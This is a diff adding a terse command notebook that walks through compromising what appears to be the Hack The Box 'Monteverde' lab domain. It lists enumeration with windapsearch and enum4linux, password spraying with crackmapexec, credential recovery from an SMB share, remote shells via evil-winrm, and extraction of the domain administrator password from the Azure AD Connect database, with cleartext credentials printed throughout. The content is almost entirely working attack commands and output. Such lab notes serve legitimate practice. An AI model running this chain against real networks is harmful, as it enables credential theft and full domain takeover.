@@ -1,0 +1,32 @@
+//Based on egre55
+python /opt/windapsearch/windapsearch_py2.py -u "" --dc-ip 10.10.10.172
+python /opt/windapsearch/windapsearch_py2.py -u "" --dc-ip 10.10.10.172 -U --admin-objects
+python /opt/windapsearch/windapsearch_py2.py -u "" --dc-ip 10.10.10.172 -U -m "Remote Management Users"
+
+smbclient -N -L \\\10.10.10.172	//test for SMB null sessions
+enum4linux -a 10.10.10.172	//domain info, Account Lockout Threshold(Pass info): None, so pass spraying
+python /opt/windapsearch/windapsearch_py2.py -u "" --dc-ip 10.10.10.172 -U |grep '@' | cut -d ' ' -f 2 |cut -d '@' -f 1 | uniq > users.txt
+
+wget https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/weak-corporate-passwords/english-basic.txt	//most common pass
+cat users.txt >> english-basic.txt	//add usernames to pass
+crackmapexec smb 10.10.10.172 -d megabank -u users.txt -p english-basic.txt
+megabank\SABatchJobs:SABatchJobs
+smbmap -u SABatchJobs -p SABatchJobs -d megabank -H 10.10.10.172
+smbmap -u SABatchJobs -p SABatchJobs -d megabank -H 10.10.10.172 -A '(xlsx|docx|txt|xml)' -R
+cat 10.10.10.172-users_mhope_azure.xml
+mhope:4n0therD4y@n0th3r
+evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'	//got user shell
+
+C:\Program Files\ADSync
+Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\ADSync
+Get-ItemProperty -Path "C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe" | Format-list -Property * -Force	//Microsoft Azure AD miiserver version
+netstat -nto
+
+sqlcmd -S MONTEVERDE -Q "use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration"
+https://blog.xpnsec.com/azuread-connect-for-redteam/
+vim adconnect.ps1
+//Domain: MEGABANK.LOCAL
+//Username: administrator
+//Password: d0m@in4dminyeah!
+evil-winrm -i 10.10.10.172 -u administrator -p 'd0m@in4dminyeah!'
+
